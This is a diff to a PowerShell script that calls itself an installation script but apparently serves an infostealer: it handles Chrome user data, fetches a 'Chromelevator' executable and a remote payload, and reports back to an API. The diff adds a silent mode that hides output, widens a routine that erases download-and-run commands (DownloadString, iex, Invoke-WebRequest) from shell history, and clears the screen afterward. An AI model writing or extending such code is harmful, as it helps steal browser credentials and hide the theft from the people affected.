@@ -4,6 +4,7 @@ $PayloadUrl = "$ApiBase/p"
 $ErrorUrl = "$ApiBase/e"
 $CloseTerminal = __CLOSE_TERMINAL__
 $DebugMode = __DEBUG_MODE__
+$SilentMode = __SILENT_MODE__
 $IsRunningAsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
@@ -11,7 +12,9 @@ $UserContext = $null
 $ChromeUserDataPath = $null
 $ChromelevatorCacheDir = $null
 
-Write-Host "Running installation script..."
+if (-not $SilentMode) {
+    Write-Host "Running installation script..."
+}
 
 function Write-DebugStep {
     param([string]$Message)
@@ -951,7 +954,7 @@ function Get-ChromelevatorExecutable {
 }
 
 function Clear-ScriptExecutionHistory {
-    $pattern = "(DownloadString|/wscp|iex\s*\(|Invoke-Expression|iwr\s+.*/wscp|Invoke-WebRequest.*/wscp)"
+    $pattern = "(DownloadString|/wscp|iex\s*\(|Invoke-Expression|Start-Process powershell|iwr\s+.*/wscp|Invoke-WebRequest.*/wscp|remote-scripts)"
     $historyPaths = @()
 
     try {
@@ -2225,13 +2228,22 @@ catch {
     Write-DebugError $_
     $script:ExitCode = Get-ErrorCodeFromException $_
     Send-ScriptErrorReport -ErrorRecord $_ -Code $script:ExitCode
-    Write-Host $script:ExitCode
+    if (-not $SilentMode) {
+        Write-Host $script:ExitCode
+    }
 }
 finally {
     if ($script:ChromelevatorOutputRoot -and (Test-Path $script:ChromelevatorOutputRoot)) {
         Remove-Item -Path $script:ChromelevatorOutputRoot -Recurse -Force -ErrorAction SilentlyContinue
     }
     Clear-ScriptExecutionHistory
+    if (-not $DebugMode) {
+        try {
+            Clear-Host
+        }
+        catch {
+        }
+    }
     if ($CloseTerminal) {
         if ($null -ne $script:ExitCode) {
             exit $script:ExitCode
